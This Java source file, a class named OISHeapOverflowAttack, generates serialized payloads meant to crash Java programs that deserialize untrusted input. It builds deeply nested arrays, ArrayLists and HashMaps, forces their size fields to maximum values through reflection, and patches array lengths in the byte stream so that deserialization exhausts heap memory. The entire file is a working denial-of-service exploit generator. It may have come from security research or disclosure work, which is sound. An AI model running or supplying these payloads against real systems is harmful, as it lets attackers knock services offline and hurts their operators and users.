package cz.topolik.oisdos;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.ObjectOutputStream;
import java.io.ObjectStreamConstants;
import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.HashMap;

/**
 * @author Tomas Polesovsky
 */
public class OISHeapOverflowAttack {
	private static final int MAX_ARRAY_SIZE;
	private static final int MAXIMUM_CAPACITY;
	private static final int OBJECT_ARRAY_SIZE_TEMP_VAL = 1234;

	static {
		Field maxArraySizeFiled = null;
		try {
			maxArraySizeFiled = ArrayList.class.getDeclaredField("MAX_ARRAY_SIZE");
			maxArraySizeFiled.setAccessible(true);

			MAX_ARRAY_SIZE = maxArraySizeFiled.getInt(null);
		} catch (NoSuchFieldException e) {
			throw new RuntimeException("Unable to obtain field ArrayList.MAX_ARRAY_SIZE", e);
		} catch (IllegalAccessException e) {
			throw new RuntimeException("Unable to read ArrayList.MAX_ARRAY_SIZE", e);
		}

		Field maxHashMapCapacity = null;
		try {
			maxHashMapCapacity = HashMap.class.getDeclaredField("MAXIMUM_CAPACITY");
			maxHashMapCapacity.setAccessible(true);

			MAXIMUM_CAPACITY = maxHashMapCapacity.getInt(null);
		} catch (NoSuchFieldException e) {
			throw new RuntimeException("Unable to obtain field HashMap.MAXIMUM_CAPACITY", e);
		} catch (IllegalAccessException e) {
			throw new RuntimeException("Unable to read HashMap.MAXIMUM_CAPACITY", e);
		}

	}

	public static byte[] generateObjectArrayPayload(int depth) throws Exception {
		Object[] deepArray = createDeepArray(null, depth);

		ByteArrayOutputStream baos = new ByteArrayOutputStream();
		try {
			new ObjectOutputStream(baos).writeObject(deepArray);
		}
		catch (Throwable e) {
			// expected, there are not so many items inside
		}

		byte[] payload = baos.toByteArray();

		/*
		 * Replace array length (1234) with MAX_ARRAY_SIZE to trigger allocating of as much memory as we can
		 */

		ByteArrayOutputStream out = new ByteArrayOutputStream();
		new DataOutputStream(out).writeInt(OBJECT_ARRAY_SIZE_TEMP_VAL);
		byte[] needle = out.toByteArray();

		// find the needle in haystack
		for (int i = 0; i < payload.length - 4; i++) {
			if (payload[i+0] == needle[0] && payload[i+1] == needle[1] && payload[i+2] == needle[2] && payload[i+3] == needle[3]) {
				out.reset();
				new DataOutputStream(out).writeInt(MAX_ARRAY_SIZE);
				// replace array length with max value
				System.arraycopy(out.toByteArray(), 0, payload, i, 4);
				i+= 4;
			}
		}

		/*
		 * Truncate payload, we expect heap overflow before reaching end of stream
		 */
		int truncatedLength = payload.length;
		for (int i = payload.length - 1; i > 0; i--) {
			// there are only null values in the deepArray
			if (payload[i] != ObjectStreamConstants.TC_NULL) {
				truncatedLength = i + 1;
				break;
			}
		}

		byte[] truncated = new byte[truncatedLength];
		System.arraycopy(payload, 0, truncated, 0, truncatedLength);
		return truncated;
	}

	public static byte[] generateArrayListPayload(int depth) throws Exception {
		ArrayList deepList = createDeepList(null, depth);
		setSizeUsingReflection(deepList, MAX_ARRAY_SIZE);

		ByteArrayOutputStream baos = new ByteArrayOutputStream();
		try {
			new ObjectOutputStream(baos).writeObject(deepList);
		}
		catch (Throwable e) {
			// expected, there are not so many items inside
		}

		return baos.toByteArray();
	}

	public static byte[] generateHashMapPayload(int depth) throws Exception {
		HashMap deepMap = createDeepMap(null, depth);
		setSizeUsingReflection(deepMap, MAXIMUM_CAPACITY);

		ByteArrayOutputStream baos = new ByteArrayOutputStream();
		try {
			new ObjectOutputStream(baos).writeObject(deepMap);
		}
		catch (Throwable e) {
			// expected, there are not so many items inside
		}

		return baos.toByteArray();
	}

	/*
	 * Create recursive objects
	 */

	private static Object[] createDeepArray(Object[] child, int depth) {
		if (child == null) {
			child = new Object[OBJECT_ARRAY_SIZE_TEMP_VAL];
		}

		if (depth <= 1) {
			return child;
		}

		Object[] parent = new Object[OBJECT_ARRAY_SIZE_TEMP_VAL];
		parent[0] = child;

		return createDeepArray(parent, depth - 1);
	}

	private static ArrayList createDeepList(ArrayList child, int depth) {
		if (child == null) {
			child = new ArrayList();
			// add one last element so that buffer is flushed
			child.add(null);
		}

		if (depth <= 1) {
			return child;
		}

		ArrayList parent = new ArrayList();
		parent.add(child);

		return createDeepList(parent, depth - 1);
	}

	private static HashMap createDeepMap(HashMap child, int depth) {
		if (child == null) {
			child = new HashMap();
			// add one last element so that buffer is flushed
			child.put(null, null);
		}

		if (depth <= 1) {
			return child;
		}

		HashMap parent = new HashMap<>();
		parent.put(child, null);

		return createDeepMap(parent, depth - 1);
	}

	/*
	 * Where possible, set size on objects using reflection
	 */

	private static void setSizeUsingReflection(ArrayList list, int size) throws Exception {
		Field sizeField = ArrayList.class.getDeclaredField("size");
		sizeField.setAccessible(true);

		while (list != null) {
			sizeField.set(list, size);
			list = (ArrayList) list.get(0);
		}
	}

	private static void setSizeUsingReflection(HashMap map, int size) throws Exception {
		Field sizeField = HashMap.class.getDeclaredField("size");
		sizeField.setAccessible(true);

		while (map != null) {
			sizeField.set(map, size);
			map = (HashMap) map.keySet().iterator().next();
		}
	}
}
